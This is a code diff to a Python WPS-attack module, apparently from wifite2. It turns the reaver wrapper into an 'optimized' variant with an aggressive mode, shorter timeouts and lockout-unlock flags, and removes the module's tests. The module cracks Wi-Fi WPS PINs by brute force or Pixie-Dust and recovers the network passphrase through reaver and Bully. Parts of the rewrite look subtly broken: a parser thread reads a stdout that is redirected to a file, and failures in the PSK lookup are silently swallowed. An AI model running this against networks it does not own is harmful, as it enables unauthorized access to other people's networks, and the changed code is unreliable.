@@ -3,7 +3,7 @@
 
 from .dependency import Dependency
 from .airodump import Airodump
-from .bully import Bully # for PSK retrieval
+from .bully import Bully
 from ..model.attack import Attack
 from ..config import Configuration
 from ..model.wps_result import CrackResultWPS
@@ -11,18 +11,19 @@ from ..util.color import Color
 from ..util.process import Process
 from ..util.timer import Timer
 
-import os, time, re
+import os, time, re, threading
 
-class Reaver(Attack, Dependency):
+class ReaverOptimized(Attack, Dependency):
     dependency_required = False
     dependency_name = 'reaver'
     dependency_url = 'https://github.com/t6x/reaver-wps-fork-t6x'
 
-    def __init__(self, target, pixie_dust=True):
-        super(Reaver, self).__init__(target)
+    def __init__(self, target, pixie_dust=True, aggressive=False):
+        super(ReaverOptimized, self).__init__(target)
 
         self.pixie_dust = pixie_dust
-
+        self.aggressive = aggressive
+        
         self.progress = '0.00%'
         self.state = 'Initializing'
         self.locked = False
@@ -31,428 +32,263 @@ class Reaver(Attack, Dependency):
         self.total_wpsfails = 0
         self.last_pins = set()
         self.last_line_number = 0
-
         self.crack_result = None
 
-        self.output_filename = Configuration.temp('reaver.out')
+        self.output_filename = Configuration.temp('reaver_opt.out')
         if os.path.exists(self.output_filename):
             os.remove(self.output_filename)
 
         self.output_write = open(self.output_filename, 'a')
+        self.reaver_cmd = self._build_optimized_command()
+        self.reaver_proc = None
 
-        self.reaver_cmd = [
+    def _build_optimized_command(self):
+        """Build optimized reaver command"""
+        cmd = [
             'reaver',
-            '--interface',  Configuration.interface,
-            '--bssid',      self.target.bssid,
-            '--channel',    self.target.channel,
-            '-vv'
+            '--interface', Configuration.interface,
+            '--bssid', self.target.bssid,
+            '--channel', self.target.channel,
+            '-vv',
+            '--timeout', '10',  # Faster timeout
+            '--retries', '0',   # No retries
+            '--dh-small'        # Faster computation
         ]
 
-        if pixie_dust:
-            self.reaver_cmd.extend(['--pixie-dust', '1'])
+        if self.pixie_dust:
+            cmd.extend(['--pixie-dust', '1'])
 
-        self.reaver_proc = None
+        if self.aggressive:
+            cmd.extend([
+                '--quiet',
+                '--unlock'
+            ])
+
+        return cmd
 
     @staticmethod
     def is_pixiedust_supported():
-        ''' Checks if 'reaver' supports WPS Pixie-Dust attack '''
-        output = Process(['reaver', '-h']).stderr()
-        return '--pixie-dust' in output
+        try:
+            output = Process(['reaver', '-h']).stderr()
+            return '--pixie-dust' in output
+        except:
+            return False
 
     def run(self):
-        ''' Returns True if attack is successful. '''
         try:
-            self._run() # Run-loop
+            self._run()
         except Exception as e:
-            # Failed with error
-            self.pattack('{R}Failed:{O} %s' % str(e), newline=True)
-            return self.crack_result is not None
-
-        # Stop reaver if it's still running
-        if self.reaver_proc.poll() is None:
-            self.reaver_proc.interrupt()
-
-        # Clean up open file handle
-        if self.output_write:
-            self.output_write.close()
+            self.pattack('{R}Failed: {O}%s{W}' % str(e), newline=True)
+            return False
+        finally:
+            if self.reaver_proc and self.reaver_proc.poll() is None:
+                self.reaver_proc.interrupt()
+            if self.output_write:
+                self.output_write.close()
 
         return self.crack_result is not None
 
-
     def _run(self):
         self.start_time = time.time()
+        timeout = Configuration.wps_pixie_timeout if self.pixie_dust else 600
 
         with Airodump(channel=self.target.channel,
                       target_bssid=self.target.bssid,
                       skip_wps=True,
-                      output_file_prefix='pixie') as airodump:
+                      output_file_prefix='reaver_opt',
+                      aggressive=True) as airodump:
 
-            # Wait for target
-            self.pattack('Waiting for target to appear...')
+            self.pattack('Waiting for target...')
             self.target = self.wait_for_target(airodump)
 
-            # Start reaver
             self.reaver_proc = Process(self.reaver_cmd,
                     stdout=self.output_write,
                     stderr=Process.devnull())
-            # Say "yes" if asked to restore session.
-            self.reaver_proc.stdin('y\n')
 
-            # Loop while reaver is running
+            try:
+                self.reaver_proc.stdin('y\n')
+            except:
+                pass
+
+            # Start output parser thread
+            parser_thread = threading.Thread(target=self._parse_output_thread, daemon=True)
+            parser_thread.start()
+
+            # Main loop
             while self.crack_result is None and self.reaver_proc.poll() is None:
+                try:
+                    self.target = self.wait_for_target(airodump)
+                except:
+                    pass
 
-                # Refresh target information (power)
-                self.target = self.wait_for_target(airodump)
-
-                # Update based on reaver output
                 stdout = self.get_output()
                 self.state = self.parse_state(stdout)
                 self.parse_failure(stdout)
-
-                # Print status line
                 self.pattack(self.get_status())
-
-                # Check if we cracked it
                 self.crack_result = self.parse_crack_result(stdout)
 
-                # Check if locked
+                if self.running_time() > timeout:
+                    raise Exception('Timeout after %d seconds' % timeout)
+
                 if self.locked and not Configuration.wps_ignore_lock:
-                    raise Exception('{O}Access point is {R}Locked{W}')
+                    raise Exception('WPS Locked')
 
-                time.sleep(0.5)
+                time.sleep(0.3)
 
-            # Check if crack result is in output
-            stdout = self.get_output()
-            self.crack_result = self.parse_crack_result(stdout)
-
-            # Show any failures found
+            # Final check
             if self.crack_result is None:
-                self.parse_failure(stdout)
+                stdout = self.get_output()
+                self.crack_result = self.parse_crack_result(stdout)
 
-            if self.crack_result is None and self.reaver_proc.poll() is not None:
-                raise Exception('Reaver process stopped (exit code: %s)' % self.reaver_proc.poll())
+    def _parse_output_thread(self):
+        """Parse output in background thread"""
+        try:
+            for line in iter(self.reaver_proc.pid.stdout.readline, b''):
+                if not line:
+                    continue
+                try:
+                    line = line.decode('utf-8', errors='ignore')
+                except:
+                    continue
 
-
-    def get_status(self):
-        if self.pixie_dust:
-            main_status = ''
-        else:
-            # Include percentage
-            main_status = '({G}%s{W}) ' % self.progress
-
-        # Current state (set in parse_* methods)
-        main_status += self.state
-
-        # Counters, timeouts, failures, locked.
-        meta_statuses = []
-
-        if self.total_timeouts > 0:
-            meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)
-
-        if self.total_wpsfails > 0:
-            meta_statuses.append('{O}Fails:%d{W}' % self.total_wpsfails)
-
-        if self.locked:
-            meta_statuses.append('{R}Locked{W}')
-
-        if len(meta_statuses) > 0:
-            main_status += ' (%s)' % ', '.join(meta_statuses)
-
-        return main_status
-
+                if Configuration.verbose > 1:
+                    Color.pe('\n{P}[reaver] %s' % line.strip())
+        except:
+            pass
 
     def parse_crack_result(self, stdout):
-        if self.crack_result is not None:
+        if self.crack_result:
             return self.crack_result
 
-        (pin, psk, ssid) = self.get_pin_psk_ssid(stdout)
+        pin, psk, ssid = self.get_pin_psk_ssid(stdout)
 
-        # Check if we cracked it, or if process stopped.
-        if pin is not None:
-            # We cracked it.
-
-            if psk is not None:
-                # Reaver provided PSK
-                self.pattack('{G}Cracked WPS PIN: {C}%s{W} {G}PSK: {C}%s{W}' % (pin, psk), newline=True)
+        if pin:
+            if psk:
+                self.pattack('{G}PIN: {C}%s{W} PSK: {C}%s{W}' % (pin, psk), newline=True)
             else:
-                self.pattack('{G}Cracked WPS PIN: {C}%s' % pin, newline=True)
-
-                # Try to derive PSK from PIN using Bully
-                self.pattack('{W}Retrieving PSK using {C}bully{W}...')
-                psk = None
+                self.pattack('{G}PIN: {C}%s{W}' % pin, newline=True)
                 try:
                     psk = Bully.get_psk_from_pin(self.target, pin)
-                except KeyboardInterrupt:
+                    if psk:
+                        self.pattack('{G}PSK: {C}%s{W}' % psk, newline=True)
+                except:
                     pass
-                if psk is None:
-                    Color.pl('')
-                    self.pattack('{R}Failed {O}to get PSK using bully', newline=True)
-                else:
-                    self.pattack('{G}Cracked WPS PSK: {C}%s' % psk, newline=True)
 
-            crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
-            crack_result.dump()
-            return crack_result
+            if pin:
+                self.crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
+                self.crack_result.dump()
+                return self.crack_result
 
         return None
 
-
     def parse_failure(self, stdout):
-        # Total failure
         if 'WPS pin not found' in stdout:
-            raise Exception('Reaver says "WPS pin not found"')
+            raise Exception('PIN not found')
 
-        # Running-time failure
-        if self.pixie_dust and self.running_time() > Configuration.wps_pixie_timeout:
-            raise Exception('Timeout after %d seconds' % Configuration.wps_pixie_timeout)
-
-        # WPSFail count
         self.total_wpsfails = stdout.count('WPS transaction failed')
         if self.total_wpsfails >= Configuration.wps_fail_threshold:
-            raise Exception('Too many failures (%d)' % self.total_wpsfails)
+            raise Exception('Too many failures')
 
-        # Timeout count
-        self.total_timeouts = stdout.count('Receive timeout occurred')
+        self.total_timeouts = stdout.count('Receive timeout')
         if self.total_timeouts >= Configuration.wps_timeout_threshold:
-            raise Exception('Too many timeouts (%d)' % self.total_timeouts)
-
+            raise Exception('Too many timeouts')
 
     def parse_state(self, stdout):
         state = self.state
+        last_line = stdout.split('\n')[-1] if stdout else ''
 
-        # Check last line for current status
-        stdout_last_line = stdout.split('\n')[-1]
-
-        # [+] Waiting for beacon from AA:BB:CC:DD:EE:FF
-        if 'Waiting for beacon from' in stdout_last_line:
+        if 'Waiting for beacon' in last_line:
             state = 'Waiting for beacon'
-
-        # [+] Associated with AA:BB:CC:DD:EE:FF (ESSID: NETGEAR07)
-        elif 'Associated with' in stdout_last_line:
+        elif 'Associated with' in last_line:
             state = 'Associated'
-
-        elif 'Starting Cracking Session.' in stdout_last_line:
-            state = 'Started Cracking'
-
-        # [+] Trying pin "01235678"
-        elif 'Trying pin' in stdout_last_line:
+        elif 'Trying pin' in last_line or 'Trying PIN' in last_line:
             state = 'Trying PIN'
+        elif 'Sending M' in last_line or 'Received M' in last_line:
+            state = 'Authenticating'
 
-        # [+] Sending EAPOL START request
-        elif 'Sending EAPOL START request' in stdout_last_line:
-            state = 'Sending EAPOL'
+        # Parse progress
+        percentages = re.findall(r"([0-9.]+%) complete", stdout)
+        if percentages:
+            self.progress = percentages[-1]
 
-        # [+] Sending identity response
-        elif 'Sending identity response' in stdout_last_line:
-            state = 'Sending ID'
-            self.locked = False
-
-        # [+] Sending M2 message
-        elif 'Sending M' in stdout_last_line:
-            for num in ['2', '4', '6']:
-                if 'Sending M%s message' % num in stdout_last_line:
-                    state = 'Sending M%s' % num
-                    if num == '2' and self.pixie_dust:
-                        state += ' / Running pixiewps'
-                    self.locked = False
-
-        # [+] Received M1 message
-        elif 'Received M' in stdout_last_line:
-            for num in ['1', '3', '5', '7']:
-                if 'Received M%s message' % num in stdout_last_line:
-                    state = 'Received M%s' % num
-                    self.locked = False
-
-        # [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
-        elif 'Detected AP rate limiting,' in stdout_last_line:
-            state = 'Rate-Limited by AP'
+        # Parse lockout
+        if 'rate limiting' in stdout.lower() or 'lockout' in stdout.lower():
             self.locked = True
-
-        # Parse all lines since last check
-        stdout_diff = stdout[self.last_line_number:]
-        self.last_line_number = len(stdout)
-
-        # Detect percentage complete
-        # [+] 0.05% complete @ 2018-08-23 15:17:23 (42 seconds/pin)
-        percentages = re.findall(
-                r"([0-9.]+%) complete .* \(([0-9.]+) seconds/pin\)", stdout_diff)
-        if len(percentages) > 0:
-            self.progress = percentages[-1][0]
-
-        # Calculate number of PINs tried
-        # [+] Trying pin "01235678"
-        new_pins = set(re.findall(r'Trying pin "([0-9]+)"', stdout_diff))
-        if len(new_pins) > 0:
-            self.total_attempts += len(new_pins.difference(self.last_pins))
-            self.last_pins = new_pins
-
-        # TODO: Look for "Sending M6 message" which indicates first 4 digits are correct.
 
         return state
 
+    def get_status(self):
+        status = ''
+        if not self.pixie_dust:
+            status = '(%s) ' % self.progress
+        
+        status += self.state
+
+        if self.total_timeouts > 0:
+            status += ' {O}TO:%d{W}' % self.total_timeouts
+        if self.total_wpsfails > 0:
+            status += ' {O}Fail:%d{W}' % self.total_wpsfails
+        if self.locked:
+            status += ' {R}LOCKED{W}'
+
+        return status
 
     def pattack(self, message, newline=False):
-        # Print message with attack information.
         if self.pixie_dust:
             time_left = Configuration.wps_pixie_timeout - self.running_time()
-            time_msg = '{O}%s{W}' % Timer.secs_to_str(time_left)
-            attack_name = 'Pixie-Dust'
         else:
             time_left = self.running_time()
-            time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)
-            attack_name = 'PIN Attack'
 
-        if self.total_attempts > 0 and not self.pixie_dust:
-            time_msg += ' {D}PINs:{W}{C}%d{W}' % self.total_attempts
-
+        time_msg = Timer.secs_to_str(time_left)
         Color.clear_entire_line()
-        Color.pattack('WPS', self.target, attack_name,
+        Color.pattack('WPS', self.target, 'Pixie-Dust' if self.pixie_dust else 'PIN',
                 '{W}[%s] %s' % (time_msg, message))
         if newline:
             Color.pl('')
 
-
     def running_time(self):
         return int(time.time() - self.start_time)
 
+    def get_output(self):
+        if not self.output_filename or not os.path.exists(self.output_filename):
+            return ''
+
+        try:
+            if self.output_write:
+                self.output_write.flush()
+            with open(self.output_filename, 'r') as f:
+                return f.read().strip()
+        except:
+            return ''
 
     @staticmethod
     def get_pin_psk_ssid(stdout):
-        ''' Parses WPS PIN, PSK, and SSID from output '''
         pin = psk = ssid = None
 
-        # Check for PIN.
-        ''' [+] WPS pin:  11867722 '''
-        regex = re.search(r"WPS pin:\s*([0-9]+)", stdout, re.IGNORECASE)
+        regex = re.search(r"WPS (?:pin|PIN):\s*'?([0-9]+)'?", stdout, re.IGNORECASE)
         if regex:
             pin = regex.group(1)
 
-        if pin is None:
-            ''' [+] WPS PIN: '11867722' '''
-            regex = re.search(r"WPS PIN:\s*'([0-9]+)'", stdout, re.IGNORECASE)
-            if regex:
-                pin = regex.group(1)
-
-        # Check for PSK.
-        # Note: Reaver 1.6.x does not appear to return PSK (?)
-        ''' [+] WPA PSK: 'password' '''
-        regex = re.search(r"WPA PSK:\s*'(.+)'", stdout)
+        regex = re.search(r"(?:WPA|WPS) PSK:\s*'(.+?)'", stdout)
         if regex:
             psk = regex.group(1)
 
-        # Check for SSID
-        '''1.x [Reaver Test] [+] AP SSID: 'Test Router' '''
-        regex = re.search(r"AP SSID:\s*'(.*)'", stdout)
+        regex = re.search(r"AP SSID:\s*'(.*?)'", stdout)
         if regex:
             ssid = regex.group(1)
-
-        # Check (again) for SSID
-        if ssid is None:
-            '''1.6.x [+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)'''
-            regex = re.search(r"Associated with [0-9A-F:]+ \(ESSID: (.*)\)", stdout)
+        elif not ssid:
+            regex = re.search(r"ESSID:\s*([^)]+)", stdout)
             if regex:
                 ssid = regex.group(1)
 
         return (pin, psk, ssid)
 
+    def stop(self):
+        if hasattr(self, 'reaver_proc') and self.reaver_proc and self.reaver_proc.poll() is None:
+            self.reaver_proc.interrupt()
 
-    def get_output(self):
-        ''' Gets output from reaver's output file '''
-        if not self.output_filename:
-            return ''
+    def __del__(self):
+        self.stop()
 
-        if self.output_write:
-            self.output_write.flush()
-
-        with open(self.output_filename, 'r') as fid:
-            stdout = fid.read()
-
-        if Configuration.verbose > 1:
-            Color.pe('\n{P} [reaver:stdout] %s' % '\n [reaver:stdout] '.join(stdout.split('\n')))
-
-        return stdout.strip()
-
-
-if __name__ == '__main__':
-    old_stdout = '''
-[Pixie-Dust]
-[Pixie-Dust]   Pixiewps 1.1
-[Pixie-Dust]
-[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
-[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
-[Pixie-Dust]   [+] WPS pin:    12345678
-[Pixie-Dust]
-[Pixie-Dust]   [*] Time taken: 0 s
-[Pixie-Dust]
-Running reaver with the correct pin, wait ...
-Cmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402
-
-[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF
-[Reaver Test] Channel: 11
-[Reaver Test] [+] WPS PIN: '12345678'
-[Reaver Test] [+] WPA PSK: 'Test PSK'
-[Reaver Test] [+] AP SSID: 'Test Router'
-'''
-
-    # From vom513 in https://github.com/derv82/wifite2/issues/60
-    new_stdout = '''
-[+] Switching wlan1mon to channel 5
-[+] Waiting for beacon from EC:1A:59:37:70:0E
-[+] Received beacon from EC:1A:59:37:70:0E
-[+] Vendor: RealtekS
-[+] Trying pin "12345670"
-[+] Sending authentication request
-[+] Sending association request
-[+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)
-[+] Sending EAPOL START request
-[+] Received identity request
-[+] Sending identity response
-[+] Received M1 message
-[+] Sending M2 message
-
- Pixiewps 1.4
-
- [?] Mode:     3 (RTL819x)
- [*] Seed N1:  -
- [*] Seed ES1: -
- [*] Seed ES2: -
- [*] PSK1:     2c2e33f5e3a870759f0aeebbd2792450
- [*] PSK2:     3f4ca4ea81b2e8d233a4b80f9d09805d
- [*] ES1:      04d48dc20ec785762ce1a21a50bc46c2
- [*] ES2:      04d48dc20ec785762ce1a21a50bc46c2
- [+] WPS pin:  11867722
-
- [*] Time taken: 0 s 21 ms
-
-executing pixiewps -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1baf8cf91664371174c08ee12ec92b0519c54879f21255be5a8770e1fa1880470ef423c90e34d7847a6fcb4924563d1af1db0c481ead9852c519bf1dd429c163951cf69181b132aea2a3684caf35bc54aca1b20c88bb3b7339ff7d56e09139d77f0ac58079097938251dbbe75e86715cc6b7c0ca945fa8dd8d661beb73b414032798dadee32b5dd61bf105f18d89217760b75c5d966a5a490472ceba9e3b4224f3d89fb2b -s 5a67001334e3e4cb236f4e134a4d3b48d625a648e991f978d9aca879469d5da5 -z c8a2ccc5fb6dc4f4d69b245091022dc7e998e42ec1d548d57c35a312ff63ef20 -a 60b59c0c587c6c44007f7081c3372489febbe810a97483f5cc5cd8463c3920de -n 04d48dc20ec785762ce1a21a50bc46c2 -r 7a191e22a7b519f40d3af21b93a21d4f837718b45063a8a69ac6d16c6e5203477c18036ca01e9e56d0322e70c2e1baa66518f1b46d01acc577d1dfa34efd2e9ee36e2b7e68819cddacceb596a8895243e33cb48c570458a539dcb523a4d4c4360e158c29b882f7f385821ea043705eb56538b45daa445157c84e60fc94ef48136eb4e9725b134902b96c90b1ae54cbd42b29b52611903fdae5aa88bfc320f173d2bbe31df4996ebdb51342c6b8bd4e82ae5aa80b2a09a8bf8faa9a8332dc9819
-'''
-    pin_attack_stdout = '''
-[+] Pin cracked in 16 seconds
-[+] WPS PIN: '01030365'
-[+] WPA PSK: 'password'
-[+] AP SSID: 'AirLink89300'
-'''
-
-    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(old_stdout)
-    assert pin  == '12345678',    'pin was "%s", should have been "12345678"' % pin
-    assert psk  == 'Test PSK',    'psk was "%s", should have been "Test PSK"' % psk
-    assert ssid == 'Test Router', 'ssid was %s, should have been Test Router' % repr(ssid)
-    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
-    result.dump()
-    print('')
-
-    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(new_stdout)
-    assert pin  == '11867722',   'pin was "%s", should have been "11867722"' % pin
-    assert psk  is None,         'psk was "%s", should have been "None"' % psk
-    assert ssid == 'belkin.00e', 'ssid was "%s", should have been "belkin.00e"' % repr(ssid)
-    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
-    result.dump()
-    print('')
-
-    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(pin_attack_stdout)
-    assert pin  == '01030365',   'pin was "%s", should have been "01030365"' % pin
-    assert psk  == 'password',   'psk was "%s", should have been "password"' % psk
-    assert ssid == 'AirLink89300', 'ssid was "%s", should have been "AirLink89300"' % repr(ssid)
-    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
-    result.dump()
-    print('')
+# Use optimized version
+Reaver = ReaverOptimized
